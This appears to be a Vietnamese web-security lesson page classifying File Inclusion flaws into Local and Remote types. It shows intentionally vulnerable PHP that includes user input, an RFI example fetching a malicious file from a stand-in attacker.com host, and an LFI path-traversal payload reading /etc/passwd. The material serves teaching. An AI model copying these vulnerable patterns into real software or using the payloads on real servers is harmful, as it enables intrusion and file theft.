<main class="main" role="main">
    <div class="content">
        <article id="post-fi/fi_phanloai" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    Phân Loại File Inclusion
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               <?php if($src_youtube != ''){echo '<button id="introduce-btn"><img src="public/images/play-circle.png" class="img-circle img-rotate" style="height: 24px; width: 24px; margin-right: 5px" " />Hướng Dẫn</button>';} ?>
                </div>
            </div>
            <?php echo get_iframe_youtube($src_youtube); ?>
            <div class="article-entry marked-body" itemprop="articleBody">
                <p>Dựa vào nguồn của file được include vào mà người ta chia File Inclusion làm 2 loại:</p>
                <ul>
                    <li>Local File Inclusion (LFI)</li>
                    <li>Remote File Inclusion (RFI)</li>
                </ul>
                <p>Trong đó, lỗ hổng LFI là phổ biến hơn so với RFI. Còn lỗ hổng RFI thì dễ khai thác hơn.</p>
                <h1 id="Remote-File-Inclusion-RFI"><a href="#Remote-File-Inclusion-RFI" class="headerlink" title="Remote File Inclusion (RFI)"></a>Remote File Inclusion (RFI)</h1>
                <p>Remote File Inclusion là lỗ hổng cho phép kẻ tấn công có thể include file từ một tập tin được lưu trữ từ xa. Tên đúng như ý nghĩa.<br>Lỗ hổng xảy ra khi mà input của người dùng được đưa vào hàm <strong>include()</strong> và cung cấp một địa chỉ lưu trữ từ xa tới file của kẻ tấn công.</p>
                <h2 id="Vi-du"><a href="#Vi-du" class="headerlink" title="Ví dụ"></a>Ví dụ</h2>
                <p>Với đoạn code:</p>
                <pre><code class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])){
    <span class="keyword">include</span>($_GET[<span class="string">'page'</span>]);
}
</code></pre>
                <p>Nếu hacker cung cấp: <a href="http://attacker.com/hackerfile.txt" target="_blank" rel="noopener">http://attacker.com/hackerfile.txt</a><br>Thì PHP sẽ lấy file nằm ở đường dẫn <a href="http://attacker.com/hackerfile.txt" target="_blank" rel="noopener">http://attacker.com/hackerfile.txt</a> và include vào file hiện tại.<br>Kẻ tấn công chỉ việc đặt các script mã độc trong file <strong>hackerfile.txt</strong> là thành công!</p>
                <h1 id="Local-File-Inclusion-LFI"><a href="#Local-File-Inclusion-LFI" class="headerlink" title="Local File Inclusion (LFI)"></a>Local File Inclusion (LFI)</h1>
                <p>Local File Inclusion là lỗ hổng cho phép kẻ tấn công có thể include file từ các tập tin được lưu trữ tại máy chủ.<br>Lỗ hổng này khó khai thác hơn RFI khi muốn thực hiện script mã độc, bởi vì mã độc cần phải nằm trên máy chủ website.<br>Nhưng cũng nguy hiểm hơn,bởi LFI còn có thể cho kẻ tấn công đọc các file trên máy chủ web như các file config, file mã nguồn. Từ đó,việc khai thác và tấn công trở nên dễ dàng hơn nữa.</p>
                <h2 id="Vi-du-1"><a href="#Vi-du-1" class="headerlink" title="Ví dụ"></a>Ví dụ</h2>
                <p>Với đoạn code:</p>
                <pre><code class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])){
    <span class="keyword">include</span>(<span class="string">'upload/'</span>.$_GET[<span class="string">'page'</span>]);
}
</code></pre>
                <p>Nếu hacker cung cấp: ../../../../etc/passwd<br>Thì file được include sẽ là: <strong>upload/../../../../etc/passwd</strong> ,kẻ tấn công có thể đọc được file này.<br>Hoặc cung cấp: hacker.txt có nội dung là các đoạn script mã độc. Mà hacker đã thông qua chức năng file upload để upload file txt này lên.</p>
                <h1 id="Thuc-hanh"><a href="#Thuc-hanh" class="headerlink" title="Thực hành"></a>Thực hành</h1>
                <p>Sẽ hướng dẫn kĩ hơn và thực hành từng phần ở bài nói về LFI và RFI.</p>
            </div>
        </article>
        <?php if(isset($_GET['change_status'])){
            if($_GET['change_status'] == 1){change_status($id_post);}}
        echo print_footer_status($id_post,$title);
        ?>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>